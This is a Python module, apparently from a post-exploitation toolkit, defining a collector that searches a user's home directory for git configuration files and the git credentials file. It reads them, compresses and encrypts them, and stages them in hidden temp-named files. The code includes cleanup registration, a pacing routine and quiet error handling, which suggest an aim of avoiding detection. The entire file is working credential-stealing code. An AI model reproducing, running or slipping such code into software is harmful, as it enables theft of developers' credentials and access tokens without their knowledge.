
from __future__ import annotations

import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)

class GitCollector(BaseCollector):
    """
    Collect Git configuration and credentials.
    
    Targets:
      - ~/.gitconfig
      - ~/.config/git/credentials
      - Git credential-helper caches
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        # 1. Global git config
        gitconfig = Path.home() / ".gitconfig"
        if gitconfig.exists():
            yield ArtifactMetadata(
                artifact_family="git_config",
                artifact_subtype="global_gitconfig",
                source_path=str(gitconfig),
                source_platform=os.name,
                collection_method="file_read",
            )

        # 3. Local .git/config files
        for root, dirs, _ in os.walk(Path.home()):
            if ".git" in dirs:
                git_dir = Path(root) / ".git"
                config_path = git_dir / "config"
                if config_path.exists():
                    yield ArtifactMetadata(
                        artifact_family="git_config",
                        artifact_subtype="local_gitconfig",
                        source_path=str(config_path),
                        source_platform=os.name,
                        collection_method="file_read",
                    )
                # Stop descending into .git directories
                dirs.remove(".git")

        # 2. Local git credentials
        git_creds = Path.home() / ".config" / "git" / "credentials"
        if git_creds.exists():
            yield ArtifactMetadata(
                artifact_family="git_credentials",
                artifact_subtype="config_credentials",
                source_path=str(git_creds),
                source_platform=os.name,
                collection_method="file_read",
            )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        try:
            path = Path(artifact.source_path)
            if not path.exists():
                return None
            
            data    = path.read_bytes()
            sha256  = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            del data

            ext = artifact.artifact_subtype or "git"
            stage_path = self._staging_dir / f".{sha256[:16]}.{ext}.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path       = str(path),
                sha256     = sha256,
                size_bytes = len(payload),
                metadata   = artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("Git collection error (%s): %s", artifact.source_path, exc)
        return None
